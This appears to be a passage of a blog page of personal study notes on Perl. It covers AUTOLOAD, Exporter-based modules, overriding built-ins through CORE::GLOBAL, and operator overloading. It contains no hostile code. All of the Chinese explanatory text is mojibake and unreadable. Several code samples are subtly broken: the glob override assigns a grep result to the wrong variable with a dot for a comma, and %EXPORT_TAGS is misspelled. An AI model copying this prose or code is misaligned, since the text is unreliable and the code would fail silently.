perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">*pkg::sym<span class="hljs-string">&#123;SCALAR&#125;</span> <span class="hljs-comment"># å’Œ \$pkg::sym ä¸€æ ·</span><br></code></pre></td></tr></table></figure><h2 id="10-2-è‡ªåŠ¨è£…è½½"><a href="#10-2-è‡ªåŠ¨è£…è½½" class="headerlink" title="10.2 è‡ªåŠ¨è£…è½½"></a>10.2 è‡ªåŠ¨è£…è½½</h2><p>é€šå¸¸, ä¸èƒ½è°ƒç”¨ä¸€ä¸ªæ²¡æœ‰å®šä¹‰çš„å­—è¿‡ç¨‹. ä½†å¦‚æœåœ¨ä¸ºå®šä¹‰çš„å­—è¿‡ç¨‹çš„åŒ…é‡Œæœ‰ä¸€ä¸ªå­è¿‡ç¨‹å«åš AUTOLOAD, é‚£ä¹ˆå°±ä¼šè°ƒç”¨ AUTOLOAD å­è¿‡ç¨‹, åŒæ—¶è¿˜ä¼ é€’ç»™å®ƒåŸæœ¬ä¼ é€’ç»™æœ€åˆå­è¿‡ç¨‹çš„åŒæ ·å‚æ•°.</p><p>æœ€åˆçš„å­è¿‡ç¨‹çš„å…¨ç§°ä¼šå‡ºç°åœ¨åŒ…å±€éƒ¨å˜é‡ <code>$AUTOLOAD</code> é‡Œ.<br>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">AUTOLOAD</span> </span>&#123;<br>    <span class="hljs-keyword">our</span> $AUTOLOAD;<br>    <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Attempt to call $AUTOLOAD failed.\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è°ƒç”¨äº†ä¸€ä¸ªä¸å­˜åœ¨çš„å­è¿‡ç¨‹ <code>test</code>, <code>$AUTOLOAD</code> çš„å€¼åˆ™è¢«è®¾ç½®ä¸º <code>main::test</code>.</p><p>æ³¨æ„ AutoSplit, AutoLoader, SelfLoader, DynaLoader æ¨¡å—ã€‚</p><h1 id="ç¬¬åä¸€ç« -æ¨¡å—"><a href="#ç¬¬åä¸€ç« -æ¨¡å—" class="headerlink" title="ç¬¬åä¸€ç«  æ¨¡å—"></a>ç¬¬åä¸€ç«  æ¨¡å—</h1><p>ä½¿ç”¨ Exporter æŠŠç¬¦å·è¾“å…¥åˆ°å½“å‰åŒ…é‡Œ, å¯ä»¥ä¸åŠ åŒ…é™åˆ¶è¯åœ°ä½¿ç”¨æ¥è‡ªè¯¥æ¨¡å—çš„ç¬¦å·.</p><p>åœ¨æ¨¡å—åå­—ä¸­çš„ä»»ä½•åŒå†’å·éƒ½è¢«è§£é‡Šæˆä½ çš„ç³»ç»Ÿçš„ç›®å½•åˆ†éš”ç¬¦, å› æ­¤å¦‚æœä½ çš„æ¨¡å—çš„åå­—æ˜¯ <code>Red::Blue::Green</code>, Perl å°±ä¼šæŠŠå®ƒçœ‹ä½œ <code>Red/Blue/Green.pm</code></p><p>Perl å°†åœ¨ <code>@INC</code> æ•°ç»„é‡Œé¢åˆ—å‡ºçš„æ¯ä¸€ä¸ªç›®å½•é‡Œé¢æŸ¥æ‰¾æ¨¡å—.</p><p>æ¨¡å—çš„åå­—ä¸€èˆ¬é¦–å­—æ¯å¤§å†™.</p><h2 id="11-2-åˆ›å»ºæ¨¡å—"><a href="#11-2-åˆ›å»ºæ¨¡å—" class="headerlink" title="11.2 åˆ›å»ºæ¨¡å—"></a>11.2 åˆ›å»ºæ¨¡å—</h2><p>ä¸€ä¸ªæ¨¡å—å¯ä»¥æœ‰ä¸¤ä¸ªæ–¹æ³•æŠŠå®ƒçš„æ¥å£æä¾›ç»™ä½ çš„ç¨‹åºä½¿ç”¨:</p><ul><li>æŠŠç¬¦å·è¾“å‡º</li><li>å…è®¸æ–¹æ³•è°ƒç”¨</li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Bestiary;<br><span class="hljs-keyword">require</span> Exporter;<br><br><span class="hljs-keyword">our</span> @ISA = <span class="hljs-string">qw(Exporter)</span>;<br><span class="hljs-keyword">our</span> @EXPORT = <span class="hljs-string">qw(camel)</span>;<br><span class="hljs-keyword">our</span> @EXPORT_OK = <span class="hljs-string">qw($weight)</span>;<br><span class="hljs-keyword">our</span> $VERSION = <span class="hljs-number">1.00</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">camel</span> </span>&#123; <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;One-hump dromedary&quot;</span> &#125;<br><br>$weight = <span class="hljs-number">1024</span>;<br></code></pre></td></tr></table></figure><h3 id="11-2-1-æ¨¡å—ç§æœ‰å’Œè¾“å‡ºå™¨"><a href="#11-2-1-æ¨¡å—ç§æœ‰å’Œè¾“å‡ºå™¨" class="headerlink" title="11.2.1 æ¨¡å—ç§æœ‰å’Œè¾“å‡ºå™¨"></a>11.2.1 æ¨¡å—ç§æœ‰å’Œè¾“å‡ºå™¨</h3><p>Perl æ¨¡å—å’Œå…¶ç”¨æˆ·ä¹‹é—´æœ‰ä¸€ç§çº¦å®š, å¸¸è§è§„åˆ™éƒ¨åˆ†çº¦å®šæ˜¯è¯´<mark>ç¦æ­¢ä¸€ä¸ªæ¨¡å—ä¿®æ”¹ä»»ä½•æ²¡æœ‰å…è®¸å®ƒä¿®æ”¹çš„åå­—ç©ºé—´</mark>.</p><p>ä»æ¨¡å—è¾“å‡ºç¬¦å·çš„åŠ¨ä½œæœ‰æ—¶å€™è¢«ç§°ä¸º <mark>æ±¡æŸ“ä½ çš„åå­—ç©ºé—´</mark>.</p><p>å¯¼å…¥åˆ—è¡¨å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Bestiary <span class="hljs-string">qw(/am/)</span>;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸‹ä¸¤ä¸ªç­‰ä»·:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Bestiary LIST;<br></code></pre></td></tr></table></figure><p>ä¸:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl">BEGIN &#123;<br>    <span class="hljs-keyword">require</span> Bestiary;<br>    import Bestiary LIST;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="11-2-1-1-ä¸ç”¨-Exporter-çš„è¾“å…¥æ–¹æ³•è¿›è¡Œè¾“å‡º"><a href="#11-2-1-1-ä¸ç”¨-Exporter-çš„è¾“å…¥æ–¹æ³•è¿›è¡Œè¾“å‡º" class="headerlink" title="11.2.1.1 ä¸ç”¨ Exporter çš„è¾“å…¥æ–¹æ³•è¿›è¡Œè¾“å‡º"></a>11.2.1.1 ä¸ç”¨ Exporter çš„è¾“å…¥æ–¹æ³•è¿›è¡Œè¾“å‡º</h4><h4 id="11-2-1-2-ç‰ˆæœ¬æ£€æŸ¥"><a href="#11-2-1-2-ç‰ˆæœ¬æ£€æŸ¥" class="headerlink" title="11.2.1.2 ç‰ˆæœ¬æ£€æŸ¥"></a>11.2.1.2 ç‰ˆæœ¬æ£€æŸ¥</h4><p>å¦‚æœä½ çš„æ¨¡å—å®šä¹‰äº†ä¸€ä¸ª <code>$VERSION</code> å˜é‡. åˆ™å¯ä»¥:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Bestiary <span class="hljs-number">3.14</span>; <span class="hljs-comment"># Bestiary å¿…é¡»æ˜¯ç‰ˆæœ¬ 3.14 æˆ–è€…æ›´æ–°</span><br><br><span class="hljs-keyword">use</span> Bestiary v1.<span class="hljs-number">0</span>.<span class="hljs-number">4</span>;<br></code></pre></td></tr></table></figure><h4 id="11-2-1-3-ç®¡ç†æœªçŸ¥ç¬¦å·"><a href="#11-2-1-3-ç®¡ç†æœªçŸ¥ç¬¦å·" class="headerlink" title="11.2.1.3 ç®¡ç†æœªçŸ¥ç¬¦å·"></a>11.2.1.3 ç®¡ç†æœªçŸ¥ç¬¦å·</h4><p>æ”¾åœ¨ <code>@EXPORT_FAIL</code> æ•°ç»„ä¸­é¿å…æŠŠè¿™äº›ç¬¦å·è¾“å‡º.</p><p>å¦‚æœä¸€ä¸ªç¨‹åºæƒ³è¦è¾“å…¥è¿™äº›ç¬¦å·ä¸­çš„ä»»ä½•ä¸€ä¸ª, Exporter åœ¨ç”Ÿæˆä¸€ä¸ªé”™è¯¯ä¹‹å‰ç»™æ¨¡å—ä¸€ä¸ªå¤„ç†è¿™ç§æƒ…å†µçš„æœºä¼š, é€šè¿‡ä¼ é€’è¿™ä¸ªå¤±è´¥ç¬¦å·åˆ—è¡¨è°ƒç”¨ <code>export_fail</code> æ–¹æ³•, å¯ä»¥è‡ªå·±å®šä¹‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">export_fail</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    carp <span class="hljs-string">&quot;Sorry, these symblos are unavailable: @_&quot;</span>;<br>    <span class="hljs-keyword">return</span> @_;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="11-2-1-4-æ ‡ç­¾ç»‘å®šå·¥å…·å‡½æ•°"><a href="#11-2-1-4-æ ‡ç­¾ç»‘å®šå·¥å…·å‡½æ•°" class="headerlink" title="11.2.1.4 æ ‡ç­¾ç»‘å®šå·¥å…·å‡½æ•°"></a>11.2.1.4 æ ‡ç­¾ç»‘å®šå·¥å…·å‡½æ•°</h4><p><code>%EXPORT_TAGS</code> é‡Œåˆ—å‡ºçš„ç¬¦å·å¿…é¡»åŒæ—¶åœ¨ <code>@EXPORT</code> æˆ– <code>@EXPORT_OK</code> ä¸­, Exporter æä¾›äº†ä¸¤ä¸ªå‡½æ•°æ¥å¢åŠ :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">%EXPORT_TAG = ( <span class="hljs-string">foo =&gt;</span> [<span class="hljs-string">qw(aa bb cc)</span>], <span class="hljs-string">bar =&gt;</span> [<span class="hljs-string">qw(aa cc dd)</span>] );<br><br>Exporter::export_tags(<span class="hljs-string">&#x27;foo&#x27;</span>); <span class="hljs-comment"># æŠŠ aa, bb, cc åŠ åˆ° @export</span><br>Exporter::export_ok_tags(<span class="hljs-string">&#x27;bar&#x27;</span>); <span class="hljs-comment"># æŠŠ aa, cc, dd åŠ åˆ° @export_OK</span><br><br></code></pre></td></tr></table></figure><h2 id="11-3-è¦†ç›–å†…å»ºå‡½æ•°"><a href="#11-3-è¦†ç›–å†…å»ºå‡½æ•°" class="headerlink" title="11.3 è¦†ç›–å†…å»ºå‡½æ•°"></a>11.3 è¦†ç›–å†…å»ºå‡½æ•°</h2><p>ä½¿ç”¨ <code>subs</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> subs <span class="hljs-string">qw(chdir chroot chmod chown)</span>;<br><br><span class="hljs-keyword">chdir</span> $somewhere;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">chdir</span> </span>&#123; ... &#125;<br></code></pre></td></tr></table></figure><p>å†…å»ºçš„å‡½æ•°çš„æœ€æ—©çš„ç‰ˆæœ¬æ€»æ˜¯å¯ä»¥é€šè¿‡ä¼ªåŒ… CORE æ¥è®¿é—®. å› æ­¤, <code>CORE::chdir</code> å°†æ€»æ˜¯æœ€åˆç¼–è¯‘è¿› Perl é‡Œçš„ç‰ˆæœ¬, å³ä½¿ <code>chdir</code> å…³é”®å­—å·²ç»è¢«è¦†ç›–.</p><p>è¦†ç›–å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl">*CORE::GLOBAL::<span class="hljs-keyword">glob</span> = <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $pat = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">my</span> @got;<br>    <span class="hljs-keyword">local</span> *D;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">opendir</span> D, <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>        $got = <span class="hljs-keyword">grep</span> <span class="hljs-regexp">/$pat/</span>. <span class="hljs-keyword">readdir</span> D;<br>        <span class="hljs-keyword">closedir</span> D;<br>    &#125;<br>    <span class="hljs-keyword">return</span> @got;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬åä¸‰ç« -é‡è½½"><a href="#ç¬¬åä¸‰ç« -é‡è½½" class="headerlink" title="ç¬¬åä¸‰ç«  é‡è½½"></a>ç¬¬åä¸‰ç«  é‡è½½</h1><h2 id="13-1-overload-ç”¨æ³•"><a href="#13-1-overload-ç”¨æ³•" class="headerlink" title="13.1 overload ç”¨æ³•"></a>13.1 <code>overload</code> ç”¨æ³•</h2><p><code>use overload</code> å®ç°æ“ä½œç¬¦é‡è½½, å¯ä»¥å‘å…¶æä¾›ä¸€ä¸ªæ“ä½œç¬¦å’Œå¯¹åº”æ€§è´¨çš„ <mark>é”®å­—&#x2F;æ•°å€¼åˆ—è¡¨</mark> :</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> MyClass;<br><br><span class="hljs-keyword">use</span> overload <span class="hljs-string">&#x27;+&#x27;</span> =&gt; \&amp;myadd,    <span class="hljs-comment"># ä»£ç å¼•ç”¨</span><br>             <span class="hljs-string">&#x27;&lt;&#x27;</span> =&gt; <span class="hljs-string">&quot;less_then&quot;</span>, <span class="hljs-comment"># å‘½åæ–¹æ³•</span><br>             <span class="hljs-string">&#x27;abs&#x27;</span> =&gt; <span class="hljs-function"><span class="hljs-keyword">sub</span> </span>&#123; <span class="hljs-keyword">return</span> @_; &#125;; <span class="hljs-comment"># åŒ¿åå­—è¿‡ç¨‹</span><br></code></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªåé¢æ˜¯ <code>;</code>.</p><p>è¿™é‡Œæˆ‘ä»¬è‡ªå·±æä¾›çš„è¿‡ç¨‹ç§°ä¸º <mark>å¥æŸ„ (handler)</mark> </p><p>å½“ä½ ä½¿ç”¨ <code>&lt;</code> æ—¶, Perl ä¼šæ³¨æ„å…¶è¢«å£°æ˜ä¸ºä¸€ä¸ªå­—ç¬¦ä¸², å°±ä¼šå°†å…¶å½“ä½œæ–¹æ³•åç§°, è€Œä¸ä»…ä»…æ˜¯ä¸€ä¸ªå­è¿‡ç¨‹.</p><p>åœ¨æ“ä½œä¸€ä¸ªé‡è½½äº†çš„æ“ä½œç¬¦çš„æ—¶å€™, å…¶å¯¹åº”çš„å¥æŸ„æ˜¯å¸¦ç€<mark>ä¸‰ä¸ªå‚æ•°è°ƒç”¨</mark>çš„, å‰ä¸¤ä¸ªå‚æ•°æ˜¯ä¸¤ä¸ªæ“ä½œæ•°, å¦‚æœè¯¥æ“ä½œç¬¦åªä½¿ç”¨ä¸€ä¸ªæ“ä½œæ•°, ç¬¬äºŒä¸ªå‚æ•°æ˜¯ <code>undef</code>. </p><p>ç¬¬ä¸‰ä¸ªå‚æ•°æ ‡æ˜å‰ä¸¤ä¸ªå‚æ•°æ˜¯å¦äº¤æ¢. äº¤æ¢è¿‡ä¸ºçœŸ.</p><p>å¯¹äºå•ç›®æ“ä½œç¬¦, å½“è¯¥æ“ä½œç¬¦åº”ç”¨äºè¯¥ç±»çš„ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™åˆ™è°ƒç”¨ä¸ºè¯¥ç±»å£°æ˜çš„å¥æŸ„. </p><p>å¯¹äºåŒç›®æ“ä½œç¬¦, å½“ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯è¯¥ç±»çš„ä¸€ä¸ªå¯¹è±¡æˆ–å½“ç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯è¯¥ç±»çš„å¯¹è±¡è€Œä¸”ç¬¬ä¸€ä¸ªæ“ä½œæ•°æ²¡æœ‰é‡è½½æ€§è´¨çš„æ—¶å€™,åˆ™è°ƒç”¨è¯¥å¥æŸ„.</p><p>å”¯ä¸€çš„ä¸‰å…ƒæ“ä½œç¬¦ <code>?:</code> ä¸èƒ½è¢«é‡è½½.</p><p>é»˜è®¤ä¼ å…¥çš„å‚æ•°å°±æ˜¯å¯¹è±¡, å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Test;<br><span class="hljs-keyword">use</span> Moose;<br><span class="hljs-keyword">use</span> <span class="hljs-number">5.36</span>.<span class="hljs-number">0</span>;<br><span class="hljs-keyword">use</span> utf8;<br><span class="hljs-keyword">use</span> overload <span class="hljs-string">&#x27;+&#x27;</span> =&gt; <span class="hljs-string">&#x27;plus&#x27;</span>;<br><br>has <span class="hljs-string">&#x27;value&#x27;</span> =&gt; (<br>    <span class="hljs-string">is =&gt;</span> <span class="hljs-string">&#x27;ro&#x27;</span>,<br>    <span class="hljs-string">isa =&gt;</span> <span class="hljs-string">&#x27;Str&#x27;</span>,<br>);<br><br><span class="hljs-keyword">my</span> $fir_str = Test-&gt;new(<span class="hljs-string">value =&gt;</span> <span class="hljs-string">&#x27;Hello&#x27;</span>);<br><span class="hljs-keyword">my</span> $sec_str = Test-&gt;new(<span class="hljs-string">value =&gt;</span> <span class="hljs-string">&#x27;World&#x27;</span>);<br><span class="hljs-keyword">print</span> $fir_str + $sec_str;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">plus</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> ($fir_str, $sec_str) = @_;<br>    $fir_str-&gt;value() . $sec_str-&gt;value();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="13-3-å¯é‡è½½æ“ä½œç¬¦"><a href="#13-3-å¯é‡è½½æ“ä½œç¬¦" class="headerlink" title="13.3 å¯é‡è½½æ“ä½œç¬¦"></a>13.3 å¯é‡è½½æ“ä½œç¬¦</h2><p>åªæœ‰ä¸€éƒ¨åˆ†æ“ä½œç¬¦å¯ä»¥é‡è½½.</p><p>å¯ä»¥åœ¨ <code>%overload::ops</code> æ•£åˆ—ä¸­æ‰¾åˆ°å·²ç»è¢«é‡è½½çš„æ“ä½œç¬¦.</p><p><img src="/../img/perl_overload_ops.png"></p><p>æœ‰äº›å¹¶ä¸æ˜¯æ“ä½œç¬¦, ä½†éƒ½æ˜¯æœ‰æ•ˆé”®å­—.</p><h2 id="13-4-æ‹·è´æ„é€ å™¨"><a href="#13-4-æ‹·è´æ„é€ å™¨" class="headerlink" title="13.4 æ‹·è´æ„é€ å™¨ ="></a>13.4 æ‹·è´æ„é€ å™¨ <code>=</code></h2><p>å…¶ä½œä¸ºä¸€ä¸ªé‡è½½çš„é”®å­—æœ‰ç‚¹ç‰¹æ®Šçš„å«ä¹‰. å…¶å¹¶ä¸é‡è½½ Perl çš„èµ‹å€¼æ“ä½œç¬¦.</p><p>ä¹¦ä¸Šå†…å®¹ä¸æ˜¯å¾ˆç†è§£.</p><h2 id="13-5-å½“ç¡®å®é‡è½½å¥æŸ„çš„æ—¶å€™-nomethod-å’Œ-fallback"><a href="#13-5-å½“ç¡®å®é‡è½½å¥æŸ„çš„æ—¶å€™-nomethod-å’Œ-fallback" class="headerlink" title="13.5 å½“ç¡®å®é‡è½½å¥æŸ„çš„æ—¶å€™ (nomethod å’Œ fallback)"></a>13.5 å½“ç¡®å®é‡è½½å¥æŸ„çš„æ—¶å€™ (nomethod å’Œ fallback)</h2><p>å¦‚æœå¯¹ä¸€ä¸ªå¯¹è±¡ä½¿ç”¨ä¸€ä¸ªæ²¡æœ‰é‡è½½å¥æŸ„çš„æ“ä½œç¬¦, Perl ä¼šæ‰¾é‡è½½ <code>nomethod</code> å¾—åˆ°çš„è¡Œä¸º, åœ¨é‡è½½æ“ä½œç¬¦ä¸­ç›¸å½“äºå­è¿‡ç¨‹ä¸­çš„ <code>AUTOLOAD</code>.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Test;<br><span class="hljs-keyword">use</span> Moose;<br><span class="hljs-keyword">use</span> <span class="hljs-number">5.36</span>.<span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">use</span> overload <span class="hljs-string">&#x27;nomethod&#x27;</span> =&gt; \&amp;say_something;<br><br><span class="hljs-keyword">my</span> $obj1 = Test-&gt;new();<br><span class="hljs-keyword">my</span> $obj2 = Test-&gt;new();<br><br><span class="hljs-keyword">print</span> $obj1 + $obj2;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">say_something</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;That&#x27;s it&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæœªå®šä¹‰ä¸¤ä¸ªå¯¹è±¡ç›¸åŠ , å°±è°ƒç”¨äº† <code>nomethod</code> å¯¹åº”çš„å¥æŸ„, å…¶å®é™…ä¸Šä¼ å…¥äº†å››ä¸ªå‚æ•°:</p><ul><li>æ“ä½œç¬¦ä¸¤ä¾§</li><li>æ˜¯å¦äº¤æ¢</li><li>æ“ä½œç¬¦</li></ul><p>å¦‚æœ Perl æ‰¾ä¸åˆ° <code>nomethod</code> å¥æŸ„, å°±ä¼šæŠ¥é”™.</p><p>ä¸ºäº†åœ¨æ²¡æ‰¾åˆ°æ—¶å¾—åˆ°æ²¡æœ‰é‡è½½çš„ç»“æœ, ä½¿ç”¨ <code>fallback</code> å…³é”®å­—. å…¶æœ‰ä¸‰ä¸ªçŠ¶æ€ (å°±æ˜¯ä½¿ç”¨ <code>overload</code> ç»™ <code>fallback</code> èµ‹å€¼):</p><ul><li><code>undef</code>, å°±æ˜¯æœªå®šä¹‰ <code>fallback</code> æ—¶çš„çŠ¶æ€, ä¸åšå‡ºä»»ä½•è¡Œä¸º</li><li><code>defined but false</code>, ä¸ä¼šè¿›è¡Œè‡ªåŠ¨ç”Ÿæˆ</li><li><code>true</code></li></ul><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> overload <span class="hljs-string">&quot;fallback&quot;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-comment"># ...</span><br></code></pre></td></tr></table></figure><p>å…·ä½“è¿˜æ˜¯ä¸å¤ªç†è§£.</p><h2 id="13-6-é‡è½½å¸¸é‡"><a href="#13-6-é‡è½½å¸¸é‡" class="headerlink" title="13.6 é‡è½½å¸¸é‡"></a>13.6 é‡è½½å¸¸é‡</h2><p>å¯ä»¥ç”¨  <code>overload::constant</code> å’Œ <code>overload::remove_constant</code> æ”¹å˜ Perl è§£é‡Šå¸¸é‡çš„æ–¹æ³•.</p><p>ä¸€èˆ¬æ”¾åœ¨ä¸€ä¸ªåŒ…çš„ <code>import</code> æ–¹æ³•ä¸­ä½¿ç”¨:</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">import</span> </span>&#123;<br>    overload::constant (<br>        <span class="hljs-string">integer =&gt;</span> \&amp;integer_handler,<br>        <span class="hljs-string">float   =&gt;</span> \&amp;base_handler,<br>        <span class="hljs-string">binary  =&gt;</span> \&amp;base_handler,<br>        <span class="hljs-string">q       =&gt;</span> \&amp;string_handler,<br>        <span class="hljs-string">qr      =&gt;</span> \&amp;regex_handler<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p><code>overload::constant</code> åè·Ÿå‚æ•°, å‚æ•°ä¸ºé”®å€¼å¯¹, é”®åªèƒ½ä¸º:</p><ul><li><code>integer</code></li><li><code>float</code></li><li><code>binary</code></li><li><code>q</code>, è¡¨ç¤º <code>string</code> ä¸­çš„</li><li><code>qr</code>, è¡¨ç¤º <code>regex</code> ä¸­çš„</li></ul><p>å€¼ä¸ºä¸€ä¸ªå­è¿‡ç¨‹å¼•ç”¨.</p><p>è¡¨ç¤º, å½“ Perl è®°å·æŸ¥æ‰¾å…¶ç¢°åˆ°ä¸€ä¸ª<mark>å¸¸é‡æ•°å­— (å³ç”¨ <code>use constant</code> å£°æ˜çš„æ•°å­—)</mark>æ—¶, å°±ä¼šè°ƒç”¨ <code>integer</code> å’Œ <code>float</code> æä¾›çš„å¥æŸ„.</p><p>Perl ä¼šç»™å¥æŸ„ä¼ é€’ä¸‰ä¸ªå‚æ•°: </p><ul><li>ç¬¬ä¸€ä¸ª, åŸæ¥çš„å¸¸é‡, å½¢å¼æ˜¯å®ƒåŸæ¥æä¾›ç»™ Perl çš„å½¢å¼</li><li>ç¬¬äºŒä¸ª, æ˜¯ Perl å®é™…ä¸Šå¦‚ä½•è§£é‡Šè¯¥å¸¸é‡, å¦‚ <code>123_456</code> æ˜¾ç¤ºä¸º <code>123456</code></li><li>ç¬¬ä¸‰ä¸ª, åªä¸ºé‚£äº›ç”± <code>q</code> å’Œ <code>qr</code> å¤„ç†å­—ä¸²çš„å¥æŸ„å®šä¹‰. å€¼ä¸º <code>qq</code>, <code>q</code>, <code>s</code>, <code>tr</code> ä¹‹ä¸€, å«ä¹‰è§ä¹¦</li></ul><p>ä¼¼ä¹ç›´æ¥ç”¨ä¸å¤ªè¡Œ, éœ€è¦ä»æ¨¡å—ä¸­å¯¼å‡ºæ—¶åˆ©ç”¨ <code>import</code>.</p><p>å¦‚, ä¸€ä¸ªæ¨¡å—:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Orkarin;<br><span class="hljs-keyword">use</span> overload;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">Hello</span> </span>&#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello!&quot;</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">import</span> </span>&#123;<br>    overload::constant(<br>        <span class="hljs-string">integer =&gt;</span> \&amp;handler,<br>    );<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">handler</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $integer = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">return</span> $integer * <span class="hljs-number">10</span>;<br>&#125;<br><br><br><span 